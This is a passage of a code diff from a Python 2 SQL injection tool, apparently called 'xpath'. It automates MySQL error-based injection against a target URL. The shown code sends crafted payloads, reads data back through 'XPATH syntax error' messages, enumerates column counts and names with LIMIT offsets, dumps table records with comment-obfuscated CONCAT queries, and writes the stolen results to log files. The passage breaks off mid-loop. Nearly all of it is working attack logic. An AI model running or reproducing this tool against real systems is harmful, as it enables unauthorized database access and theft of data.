-                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                    no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                     if 'XPATH syntax error' in respdata:
-                                        vul = True
-                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
-                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                        print fw + sn + 'Parameter: (GET)'
-                                        infos += 'Parameter: (GET)\n'
-                                        print fw + sn + '\tType: error-based'
-                                        infos += '\tType: error-based\n'
-                                        print fw + sn + '\tTitle: %s' % test
-                                        infos += '\tTitle: %s\n' % test
-                                        print fw + sn + '\tPayload: %s' % tgt
-                                        infos += '\tPayload: %s\n' % tgt
-                                        # ----------------------------------------
-                                        # for later usage of dumiping other things
-                                        CreatePayloadFile()
-                                        with open(payload,'w') as ft:
-                                            ft.write('%s' % tgt)
-                                            ft.close()
-                                        # ----------------------------------------
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                    
-                                except IndexError as e:
-                                    pass
-                                except Exception as e:
-                                    #print '[-] %s' % e
-                                    pass
-                                except KeyboardInterrupt:
-                                    KeyBoardInterrupt()
-                                    break
-                                else:
-                                    Query_Test = False
-                                    if wsr and war:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                                        infos += "web server technology: %s, %s\n" % (war, wsr)
-                                    else:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                                        infos += "web server technology: %s\n" % wsr
-                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-                                    infos += "the back-end DBMS: MySQL\n"
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
-                                    for QueryIndex in COL_COUNT_FROM_TBL:
-                                        if not Query_Test:
-                                            QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex','strict'))
-                                            if '0x72306f74' in tgt:
-                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
+                                        Query_Test = True
+                                        #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                        if '0' in no_of_cols:
+                                            print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                            break
+                                        else:
+                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                        dbvul = False
+                                        for QueryIndex in COL_DUMP_FROM_TBL:
+                                            if not dbvul:
+                                                #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
+                                                QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
+                                                if '0x72306f74' in tempfread:
+                                                    FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                     try:
-                                                        respdata = resp.read()
-                                                        no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            Query_Test = True
-                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
-                                                            dbvul = False
-                                                            for QueryIndex in COL_DUMP_FROM_TBL:
-                                                                if not dbvul:
-                                                                    QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
-                                                                    if '0x72306f74' in tgt:
-                                                                        FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                        req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                        resp = urlopen(req, timeout=10)
+                                                    except URLError as e:
+                                                        URLError()
+                                                        sleep(1)
+                                                        pass
+                                                    except HTTPError as e:
+    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                        sleep(1)
+                                                        pass
+                                                    except (IOError, httplib.HTTPException) as e:
+                                                        ConnTimeOut()
+                                                        pass
+                                                    except KeyboardInterrupt:
+                                                        KeyBoardInterrupt()
+                                                        break
+                                                    else:
+                                                        try:
+                                                            respdata = resp.read()
+                                                            isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            if 'XPATH syntax error' in respdata:
+                                                                dbvul = True
+                                                                DbDumpQuery = FinalCountQuery_replaced
+                                                                temp = 0
+                                                                noc = int(no_of_cols)
+                                                                infos += "Database: %s\n" % db
+                                                                infos += "Table: %s\n" % tbl
+                                                                infos += "["+str(noc)+" columns]\n"
+                                                                #tmp = ""
+                                                                while temp < noc:
+                                                                    if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                    elif 'LIMIT%20' in DbDumpQuery:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
+                                                                    else:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                    
+                                                                    try:
+                                                                        req = Request(url, data=tempQuery, headers={'User-agent':ua})
+                                                                        resp = urlopen(req, timeout=10)
+                                                                    except URLError as e:
+                                                                        URLError()
+                                                                        if temp==0:
+                                                                            temp=0
+                                                                        else:
+                                                                            temp = temp
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except HTTPError as e:
+    ##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except (IOError, httplib.HTTPException) as e:
+                                                                        ConnTimeOut()
+                                                                        if temp==0:
+                                                                            temp=0
+                                                                        else:
+                                                                            temp = temp
+                                                                        pass
+                                                                    except KeyboardInterrupt:
+                                                                        print fw + sn + "Database: %s" % db
+                                                                        print fw + sn + "Table: %s" % tbl
+                                                                        print fw + sn + "[Dumped "+str(temp)+" columns]"
+                                                                        #print fw + sn + tmp
+                                                                        col = pt(["columns"])
+                                                                        col.align = "l"
+                                                                        col.header = False
+                                                                        for cols in dumps:
+                                                                            col.add_row([cols])
+                                                                            pass
+                                                                        print fw + sn + str(col)
+                                                                        f.write(infos)
+                                                                        f.write(str(col)+"\n")
+                                                                        f.close()
+                                                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                                                                        KeyBoardInterrupt()
+                                                                        break
+                                                                    else:
                                                                         try:
-                                                                            req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
-                                                                            resp = urlopen(req, timeout=10)
-                                                                        except URLError as e:
-                                                                            URLError()
-                                                                            sleep(1)
+                                                                            respdata = resp.read()
+                                                                            name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                            if 'XPATH syntax error' in respdata:
+                                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
+                                                                                #infos += "[*] %s\n" % name_of_cols
+                                                                                #tmp += "[*] %s\n" % name_of_cols
+                                                                                dumps.append(name_of_cols)
+                                                                                temp += 1
+                                                                                
+                                                                        except IndexError as e:
                                                                             pass
-                                                                        except HTTPError as e:
-                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                            sleep(1)
-                                                                            pass
-                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                            ConnTimeOut()
+                                                                        except Exception as e:
+                                                                            #print '[-] %s' % e
+                                                                            #sys.exit(0)
                                                                             pass
                                                                         except KeyboardInterrupt:
                                                                             KeyBoardInterrupt()
                                                                             break
-                                                                        else:
-                                                                            try:
-                                                                                respdata = resp.read()
-                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                if 'XPATH syntax error' in respdata:
-                                                                                    dbvul = True
-                                                                                    DbDumpQuery = FinalDumpQuery_replaced
-                                                                                    temp = 0
-                                                                                    noc = int(no_of_cols)
-                                                                                    infos += "Database: %s\n" % db
-                                                                                    infos += "Table: %s\n" % tbl
-                                                                                    infos += "["+str(noc)+" columns]\n"
-                                                                                    #tmp = ""
-                                                                                    while temp < noc:
-                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                                        elif 'LIMIT%20' in DbDumpQuery:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
-                                                                                        else:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-
-                                                                                        try:
-                                                                                            req = Request(url, data=tempQuery, headers={'User-agent':ua})
-                                                                                            resp = urlopen(req, timeout=10)
-                                                                                        except URLError as e:
-                                                                                            URLError()
-                                                                                            if temp == 0:
-                                                                                                temp = 0
-                                                                                            else:
-                                                                                                temp = temp
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except HTTPError as e:
-##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                                            ConnTimeOut()
-                                                                                            if temp == 0:
-                                                                                                temp = 0
-                                                                                            else:
-                                                                                                temp = temp
-                                                                                            pass
-                                                                                        except KeyboardInterrupt:
-                                                                                            print fg + sb + "Database: %s" % db
-                                                                                            print fg + sb + "Table: %s" % tbl
-                                                                                            print fg + sb + "[Dumped "+str(temp)+" columns]"
-                                                                                            #print fg + sb + tmp
-                                                                                            col = pt(["columns"])
-                                                                                            col.align = "l"
-                                                                                            col.header = False
-                                                                                            for cols in dumps:
-                                                                                                col.add_row([cols])
-                                                                                                pass
-                                                                                            print fg + sn + str(col)
-                                                                                            f.write(infos)
-                                                                                            f.write(str(col)+"\n")
-                                                                                            f.close()
-                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                                            KeyBoardInterrupt()
-                                                                                            break
-                                                                                        else:
-                                                                                            try:
-                                                                                                respdata = resp.read()
-                                                                                                name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                                if 'XPATH syntax error' in respdata:
-                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
-                                                                                                    #infos += "[*] %s\n" % name_of_cols
-                                                                                                    #tmp += "[*] %s\n" % name_of_cols
-                                                                                                    dumps.append(name_of_cols)
-                                                                                                    temp += 1
-                                                                                                    
-                                                                                            except IndexError as e:
-                                                                                                pass
-                                                                                            except Exception as e:
-                                                                                                #print '[-] %s' % e
-                                                                                                #sys.exit(0)
-                                                                                                pass
-                                                                                            except KeyboardInterrupt:
-                                                                                                KeyBoardInterrupt()
-                                                                                                break
-                                                                                    print fg + sb + "Database: %s" % db        
-                                                                                    print fg + sb + "Table: %s" % tbl
-                                                                                    print fg + sb + "["+str(noc)+" columns]"
-                                                                                    #print fg + sb + tmp
-                                                                                    col = pt(["columns"])
-                                                                                    col.align = "l"
-                                                                                    col.header = False
-                                                                                    for cols in dumps:
-                                                                                        col.add_row([cols])
-                                                                                        pass
-                                                                                    print fg + sn + str(col)
-                                                                                        
-                                                                            except IndexError as e:
-                                                                                pass
-                                                                            except Exception as e:
-                                                                                #print '[-] %s' % e
-                                                                                #sys.exit(0)
-                                                                                pass
-                                                                            except KeyboardInterrupt:
-                                                                                KeyBoardInterrupt()
-                                                                                break
-                                                                if dbvul:
-                                                                    break
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        #print '[-] %s' % e
-                                                        #sys.exit(0)
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if Query_Test:
-                                            break            
-                        if vul:
-                            break
-                    except (TypeError, IOError, IndexError):
-                        pass
-                    except KeyboardInterrupt:
-                        KeyBoardInterrupt()
+                                                                    
+                                                                print fw + sn + "Database: %s" % db
+                                                                print fw + sn + "Table: %s" % tbl
+                                                                print fw + sn + "["+str(noc)+" columns]"
+                                                                #print fw + sn + tmp
+                                                                col = pt(["columns"])
+                                                                col.align = "l"
+                                                                col.header = False
+                                                                for cols in dumps:
+                                                                    col.add_row([cols])
+                                                                    pass
+                                                                print fw + sn + str(col)
+                                                                    
+                                                        except IndexError as e:
+                                                            pass
+                                                        except Exception as e:
+                                                            #print '[-] %s' % e
+                                                            #sys.exit(0)
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                            if dbvul:
+                                                break
+                                except IndexError as e:
+                                    pass
+                                except Exception as e:
+                                    #print '[-] %s' % e
+                                    #sys.exit(0)
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break
+                    if Query_Test:
                         break
-                    
-            f.write(infos)
-            f.write(str(col)+"\n")
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-            
-        else:
-            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
-            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
-            with open(logs, "r") as prev_session:
-                for line in islice(prev_session,1,7):
-                    out = line.rstrip()
-                    if out:
-                        print fw + sn + out
-                        infos += out+"\n"
-            prev_session.close()
-            HTTPResponses(url, data)
-            Query_Test = False
-            tempfread = tempf.readline()
-            if wsr and war:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                infos += "web server technology: %s, %s\n" % (war, wsr)
-            else:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                infos += "web server technology: %s\n" % wsr
-            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-            infos += "the back-end DBMS: MySQL\n"
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
-            for QueryIndex in COL_COUNT_FROM_TBL:
-                if not Query_Test:
-                   #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
-                    QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
-                    if '0x72306f74' in tempfread:
-                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                        try:
-                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                            resp = urlopen(req, timeout=10)
-                        except URLError as e:
-                            URLError()
-                            sleep(1)
-                            pass
-                        except HTTPError as e:
-##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                            sleep(1)
-                            pass
-                        except (IOError, httplib.HTTPException) as e:
-                            ConnTimeOut()
-                            pass
-                        except KeyboardInterrupt:
-                            KeyBoardInterrupt()
-                            break
-                        else:
-                            try:
-                                respdata = resp.read()
-                                no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                if 'XPATH syntax error' in respdata:
-                                    Query_Test = True
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
-                                    dbvul = False
-                                    for QueryIndex in COL_DUMP_FROM_TBL:
-                                        if not dbvul:
-                                            #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
-                                            QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
-                                            if '0x72306f74' in tempfread:
-                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
-                                                    try:
-                                                        respdata = resp.read()
-                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            dbvul = True
-                                                            DbDumpQuery = FinalCountQuery_replaced
-                                                            temp = 0
-                                                            noc = int(no_of_cols)
-                                                            infos += "Database: %s\n" % db
-                                                            infos += "Table: %s\n" % tbl
-                                                            infos += "["+str(noc)+" columns]\n"
-                                                            #tmp = ""
-                                                            while temp < noc:
-                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                elif 'LIMIT%20' in DbDumpQuery:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
-                                                                else:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-                                                                
-                                                                try:
-                                                                    req = Request(url, data=tempQuery, headers={'User-agent':ua})
-                                                                    resp = urlopen(req, timeout=10)
-                                                                except URLError as e:
-                                                                    URLError()
-                                                                    if temp==0:
-                                                                        temp=0
-                                                                    else:
-                                                                        temp = temp
-                                                                    sleep(1)
-                                                                    pass
-                                                                except HTTPError as e:
-##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                    sleep(1)
-                                                                    pass
-                                                                except (IOError, httplib.HTTPException) as e:
-                                                                    ConnTimeOut()
-                                                                    if temp==0:
-                                                                        temp=0
-                                                                    else:
-                                                                        temp = temp
-                                                                    pass
-                                                                except KeyboardInterrupt:
-                                                                    print fw + sn + "Database: %s" % db
-                                                                    print fw + sn + "Table: %s" % tbl
-                                                                    print fw + sn + "[Dumped "+str(temp)+" columns]"
-                                                                    #print fw + sn + tmp
-                                                                    col = pt(["columns"])
-                                                                    col.align = "l"
-                                                                    col.header = False
-                                                                    for cols in dumps:
-                                                                        col.add_row([cols])
-                                                                        pass
-                                                                    print fw + sn + str(col)
-                                                                    f.write(infos)
-                                                                    f.write(str(col)+"\n")
-                                                                    f.close()
-                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                    KeyBoardInterrupt()
-                                                                    break
-                                                                else:
-                                                                    try:
-                                                                        respdata = resp.read()
-                                                                        name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                        if 'XPATH syntax error' in respdata:
-                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
-                                                                            #infos += "[*] %s\n" % name_of_cols
-                                                                            #tmp += "[*] %s\n" % name_of_cols
-                                                                            dumps.append(name_of_cols)
-                                                                            temp += 1
-                                                                            
-                                                                    except IndexError as e:
-                                                                        pass
-                                                                    except Exception as e:
-                                                                        #print '[-] %s' % e
-                                                                        #sys.exit(0)
-                                                                        pass
-                                                                    except KeyboardInterrupt:
-                                                                        KeyBoardInterrupt()
-                                                                        break
-                                                                
-                                                            print fw + sn + "Database: %s" % db
-                                                            print fw + sn + "Table: %s" % tbl
-                                                            print fw + sn + "["+str(noc)+" columns]"
-                                                            #print fw + sn + tmp
-                                                            col = pt(["columns"])
-                                                            col.align = "l"
-                                                            col.header = False
-                                                            for cols in dumps:
-                                                                col.add_row([cols])
-                                                                pass
-                                                            print fw + sn + str(col)
-                                                                
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        #print '[-] %s' % e
-                                                        #sys.exit(0)
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if dbvul:
-                                            break
-                            except IndexError as e:
-                                pass
-                            except Exception as e:
-                                #print '[-] %s' % e
-                                #sys.exit(0)
-                                pass
-                            except KeyboardInterrupt:
-                                KeyBoardInterrupt()
-                                break
-                if Query_Test:
-                    break
-            tempf.close()
-            f.write(infos)
-            f.write(str(col)+"\n")
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-            infos = ""
+                tempf.close()
+                f.write(infos)
+                f.write(str(col)+"\n")
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                infos = ""
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                pass
             
     else:
         pass
@@ -4779,339 +4854,90 @@ def dumpTblRecords(url, data, db, tbl, col):
         try:
             tempf = open(payload,'r')
         except (Exception, IOError) as e:
-            if 'No such file or directory' in e:
-                vul = False
-                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
-                    try:
-                        if not vul:
-                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
-                            if '*' in url:
-                                first, last = url.split('*')
-                                tgt = first + temp + last
-                            else:
-                                tgt = url + temp
-                            try:
-                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
-                                req = Request(tgt, headers={'User-agent':ua})
-                                HTTPReqCount += 1
-                                resp = urlopen(req, timeout=10)
-                            except URLError as e:
-                                URLError()
-                                sleep(1)
-                                pass
-                            except HTTPError as e:
-##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                sleep(1)
-                                pass
-                            except (IOError, httplib.HTTPException) as e:
-                                ConnTimeOut()
-                                pass
-                            except KeyboardInterrupt:
-                                KeyBoardInterrupt()
-                                break
-                            else:
+            try:
+                if 'No such file or directory' in e:
+                    vul = False
+                    for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
+                        try:
+                            if not vul:
+                                temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
+                                if '*' in url:
+                                    first, last = url.split('*')
+                                    tgt = first + temp + last
+                                else:
+                                    tgt = url + temp
                                 try:
-                                    respdata = resp.read()
-                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                    if 'XPATH syntax error' in respdata:
-                                        vul = True
-                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
-                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                        print fw + sn + 'Parameter: (GET)'
-                                        infos += 'Parameter: (GET)\n'
-                                        print fw + sn + '\tType: error-based'
-                                        infos += '\tType: error-based\n'
-                                        print fw + sn + '\tTitle: %s' % test
-                                        infos += '\tTitle: %s\n' % test
-                                        print fw + sn + '\tPayload: %s' % tgt
-                                        infos += '\tPayload: %s\n' % tgt
-                                        # ----------------------------------------
-                                        # for later usage of dumiping other things
-                                        CreatePayloadFile()
-                                        with open(payload,'w') as ft:
-                                            ft.write('%s' % tgt)
-                                            ft.close()
-                                        # ----------------------------------------
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                except IndexError as e:
+                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
+                                    req = Request(tgt, headers={'User-agent':ua})
+                                    HTTPReqCount += 1
+                                    resp = urlopen(req, timeout=10)
+                                except URLError as e:
+                                    URLError()
+                                    sleep(1)
                                     pass
-                                except Exception as e:
+                                except HTTPError as e:
+    ##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                    sleep(1)
+                                    pass
+                                except (IOError, httplib.HTTPException) as e:
+                                    ConnTimeOut()
                                     pass
                                 except KeyboardInterrupt:
                                     KeyBoardInterrupt()
                                     break
                                 else:
-                                    Query_Test = False
-                                    if wsr and war:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                                        infos += "web server technology: %s, %s\n" % (war, wsr)
-                                    else:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                                        infos += "web server technology: %s\n" % wsr
-                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-                                    infos += "the back-end DBMS: MySQL\n"
-                                    out = ', '.join(map(str,ColumnList))
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
-                                    for QueryIndex in REC_COUNT_FROM_TBL:
-                                        if not Query_Test:
-                                            QueryToTest = QueryIndex % (db,tbl)
-                                            if '0x72306f74' in tgt:
-                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
-                                                    try:
-                                                        respdata = resp.read()
-                                                        no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            Query_Test = True
-                                                            if '0' in no_of_recs:
-                                                                print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
-                                                                break
-                                                            else:
-                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
-                                                                dbvul = False
-                                                                for QueryIndex in REC_DUMP_FROM_TBL:
-                                                                    if not dbvul:
-                                                                        QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
-                                                                        if '0x72306f74' in tgt:
-                                                                            FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
-                                                                            try:
-                                                                                req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
-                                                                                resp = urlopen(req, timeout=10)
-                                                                            except URLError as e:
-                                                                                URLError()
-                                                                                sleep(1)
-                                                                                pass
-                                                                            except HTTPError as e:
-    ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                                sleep(1)
-                                                                                pass
-                                                                            except (IOError, httplib.HTTPException) as e:
-                                                                                ConnTimeOut()
-                                                                                pass
-                                                                            except KeyboardInterrupt:
-                                                                                KeyBoardInterrupt()
-                                                                                break
-                                                                            else:
-                                                                                try:
-                                                                                    respdata = resp.read()
-                                                                                    isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                    if 'XPATH syntax error' in respdata:
-                                                                                        dbvul = True
-                                                                                        if '%20' in FinalDumpQuery_replaced:
-                                                                                            testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
-                                                                                        else:
-                                                                                            testQuery = FinalDumpQuery_replaced
-                                                                                        
-                                                                                        if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
-                                                                                            DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')
-
-                                                                                        elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
-                                                                                            DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
-                                                                                            
-                                                                                        else:
-                                                                                            pass
-                                                                                        
-                                                                                        temp = 0
-                                                                                        nor = int(no_of_recs)
-                                                                                        infos += "Database: %s\n" % db
-                                                                                        infos += "Table: %s\n" % tbl
-                                                                                        infos += "["+str(nor)+" recs]\n"
-                                                                                        tmp = ""
-                                                                                        while temp < nor:
-                                                                                            t = 0
-                                                                                            for columns in ColumnList:
-                                                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                                                elif 'LIMIT%%20' in DbDumpQuery:
-                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
